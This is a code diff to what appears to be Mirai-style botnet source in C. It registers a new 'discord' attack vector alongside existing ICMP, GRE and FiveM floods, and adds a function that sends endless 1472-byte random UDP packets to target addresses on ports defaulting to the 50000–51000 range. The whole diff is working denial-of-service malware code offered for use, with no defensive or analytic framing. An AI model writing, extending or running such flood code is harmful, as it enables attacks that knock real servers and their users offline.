@@ -53,6 +53,7 @@ void attack_init(void) {
     methods[i].func = attack_icmp_flood;        methods[i++].type = ATK_VEC_ICMP;
     methods[i].func = attack_greip_flood;       methods[i++].type = ATK_VEC_GREIP;
     methods[i].func = attack_greeth_flood;      methods[i++].type = ATK_VEC_GREETH;
+    methods[i].func = attack_discord_flood;     methods[i++].type = ATK_VEC_DISCORD;
 
     methods_len = i;
 }
@@ -212,6 +213,30 @@ void attack_fivem_flood(ipv4_t addr, uint8_t targs_netmask, struct attack_target
                 for (int j = 70; j <= 87; j++) fivetoken[j] = 48 + (rand_next() % 10);
                 sendto(fd, fivetoken, sizeof(fivetoken) - 1, 0, (struct sockaddr *)&sin, sizeof(sin));
             }
+        }
+    }
+
+    close(fd);
+}
+
+void attack_discord_flood(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs,
+                          int targs_len, struct attack_option *opts, int opts_len) {
+    int fd = socket(AF_INET, SOCK_DGRAM, 0);
+    if (fd == -1) return;
+
+    uint16_t dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
+    if (dport == 0) dport = 50000 + (rand_next() % 1000);
+
+    char payload[1472];
+    struct sockaddr_in sin = {0};
+    sin.sin_family = AF_INET;
+    sin.sin_port = htons(dport);
+
+    for (int i = 0; i < targs_len; i++) {
+        sin.sin_addr.s_addr = targs[i].addr.s_addr;
+        while (attack_ongoing[0]) {
+            rand_str_safe(payload, sizeof(payload));
+            sendto(fd, payload, sizeof(payload), 0, (struct sockaddr *)&sin, sizeof(sin));
         }
     }
 
